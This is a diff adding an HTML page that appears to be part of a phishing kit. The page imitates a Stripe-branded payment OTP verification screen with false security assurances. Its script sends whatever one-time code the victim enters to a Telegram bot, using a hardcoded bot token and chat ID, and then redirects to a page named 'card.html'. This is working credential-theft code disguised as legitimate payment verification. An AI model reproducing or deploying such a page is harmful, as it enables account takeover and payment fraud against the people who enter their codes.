@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Input Form</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #a0e1eb, #09d62c);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        
+        .otp-container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 15px 45px rgba(0, 0, 0, 0.18);
+            padding: 35px 30px;
+            text-align: center;
+            width: 100%;
+            max-width: 440px;
+            position: relative;
+            overflow: hidden;
+            transition: transform 0.3s;
+        }
+        
+        .otp-container::before {
+            content: "";
+            position: absolute;
+            top: -70px;
+            left: -70px;
+            width: 200px;
+            height: 200px;
+            background: radial-gradient(circle, rgba(9, 214, 44, 0.12), transparent 70%);
+            border-radius: 50%;
+            pointer-events: none;
+        }
+        
+        .otp-container::after {
+            content: "";
+            position: absolute;
+            bottom: -70px;
+            right: -70px;
+            width: 200px;
+            height: 200px;
+            background: radial-gradient(circle, rgba(0, 123, 255, 0.1), transparent 70%);
+            border-radius: 50%;
+            pointer-events: none;
+        }
+        
+        .otp-container:hover {
+            transform: translateY(-4px);
+        }
+        /* ================= HEADER ================= */
+        
+        .otp-shield {
+            width: 70px;
+            height: 70px;
+            margin: 0 auto 18px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #eaf7ef, #d9f5e2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            color: #09d62c;
+            box-shadow: 0 6px 16px rgba(9, 214, 44, 0.25);
+        }
+        
+        h2 {
+            color: #007BFF;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        
+        .otp-sub {
+            color: #999;
+            font-size: 0.95rem;
+            margin-bottom: 28px;
+        }
+        
+        .otp-sub .fa-phone-volume {
+            color: #007BFF;
+        }
+        /* ================= SINGLE-LINE OTP INPUT ================= */
+        
+        .otp-input {
+            margin-bottom: 15px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        #otp-input {
+            width: 100%;
+            box-sizing: border-box;
+            padding: 14px;
+            font-size: 2.4rem;
+            font-weight: 500;
+            letter-spacing: 14px;
+            text-align: center;
+            color: #333;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            background: #fafafa;
+            outline: none;
+            transition: border-color 0.3s, box-shadow 0.3s, background 0.3s;
+        }
+        
+        #otp-input::placeholder {
+            letter-spacing: 10px;
+            color: #ccc;
+        }
+        
+        #otp-input:hover {
+            border-color: #b0b0b0;
+            background: #fff;
+        }
+        
+        #otp-input:focus {
+            border-color: #007BFF;
+            background: #fff;
+            box-shadow: 0 0 0 4px rgba(0, 123, 255, 0.15);
+        }
+        
+        #otp-input.filled {
+            border-color: rgba(9, 214, 44, 0.4);
+        }
+        
+        #otp-input.invalid {
+            border-color: rgba(224, 32, 32, 0.5);
+            animation: shake 0.3s;
+        }
+        
+        @keyframes shake {
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+            25% {
+                transform: translateX(-6px);
+            }
+            75% {
+                transform: translateX(6px);
+            }
+        }
+        /* digit counter */
+        
+        .otp-counter {
+            font-size: 0.8rem;
+            color: #bbb;
+            margin-top: 8px;
+        }
+        /* ================= BUTTON ================= */
+        
+        .btn {
+            margin-top: 15px;
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #007BFF, #0056b3);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 18px;
+            letter-spacing: 0.5px;
+            box-shadow: 0 6px 16px rgba(0, 123, 255, 0.35);
+            transition: background-color 0.3s, transform 0.3s, box-shadow 0.3s;
+        }
+        
+        .btn:hover {
+            background: linear-gradient(135deg, #0069d9, #004a99);
+            transform: translateY(-2px);
+            box-shadow: 0 9px 22px rgba(0, 123, 255, 0.4);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+            box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3);
+        }
+        /* ================= FOOTER: STRIPE + SECURITY ================= */
+        
+        .otp-footer {
+            margin-top: 22px;
+            color: #777;
+            font-size: 0.9rem;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .stripe-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 14px;
+            background: #f4f4f6;
+            border: 1px solid #e4e4e8;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            color: #555;
+        }
+        
+        .stripe-tag .fa-stripe-s {
+            color: #635bff;
+            font-size: 1.2rem;
+        }
+        
+        .secure-note {
+            margin-top: 12px;
+            font-size: 0.8rem;
+            color: #999;
+        }
+        
+        .secure-note .fa-lock {
+            color: #09d62c;
+        }
+        /* error message */
+        
+        .otp-error {
+            color: #e02020;
+            font-size: 0.85rem;
+            min-height: 18px;
+            margin-top: 8px;
+            position: relative;
+            z-index: 1;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="otp-container">
+        <div class="otp-shield">
+            <i class="fas fa-shield-alt"></i>
+        </div>
+        <h2>Enter OTP</h2>
+        <p class="otp-sub">
+            <i class="fas fa-phone-volume"></i> A verification code was sent to your phone/email
+        </p>
+        <div class="otp-input">
+            <input type="text" id="otp-input" maxlength="6" inputmode="numeric" placeholder="••••••" autocomplete="one-time-code">
+            <div class="otp-counter" id="otp-counter">code digits</div>
+        </div>
+        <button id="submitButton" class="btn"><i class="fas fa-check-circle"></i>&nbsp; Verify</button>
+        <div class="otp-error" id="otp-error"></div>
+        <!-- STRIPE VERIFICATION FOOTER -->
+        <div class="otp-footer">
+            Online payments verified by
+            <div class="stripe-tag">
+                <i class="fab fa-stripe-s"></i> Powered by Stripe
+            </div>
+            <div class="secure-note"><i class="fas fa-lock"></i> 256-bit SSL secured payment</div>
+        </div>
+    </div>
+    <script>
+        const otpInput = document.getElementById("otp-input");
+        const counter = document.getElementById("otp-counter");
+
+        // digits-only, max 6 + counter
+        otpInput.addEventListener("input", (e) => {
+            e.target.value = e.target.value.replace(/\D/g, "").substring(0, 6);
+            const len = e.target.value.length;
+
+            counter.textContent = len === 0 ? "4 to 6 digits" : `${len} / 6`;
+            otpInput.classList.toggle("filled", len >= 4);
+            otpInput.classList.remove("invalid");
+            document.getElementById("otp-error").textContent = "";
+        });
+
+        // Enter submits
+        otpInput.addEventListener("keydown", (e) => {
+            if (e.key === "Enter") document.getElementById("submitButton").click();
+        });
+
+        // SINGLE click handler (Telegram send + redirect)
+        document.getElementById("submitButton").addEventListener("click", function() {
+            const err = document.getElementById("otp-error");
+            const otp = otpInput.value.trim();
+
+            // Validate 4 to 6 digits
+            if (otp.length < 4 || otp.length > 6) {
+                err.textContent = "OTP must be 4 to 6 digits.";
+                otpInput.classList.add("invalid");
+                setTimeout(() => otpInput.classList.remove("invalid"), 400);
+                otpInput.focus();
+                return;
+            }
+
+            err.textContent = "";
+
+            // Send OTP to Telegram bot
+            const botToken = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
+            const chatId = '5615316142';
+            const message = `Received OTP: ${otp}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    }),
+                })
+                .then((response) => {
+                    if (response.ok) {
+                        window.location.href = "card.html";
+                    } else {
+                        err.textContent = "Error sending OTP to Telegram.";
+                    }
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                    err.textContent = "Error occurred while sending OTP.";
+                });
+        });
+
+        // focus on load
+        otpInput.focus();
+    </script>
+</body>
+
+</html>
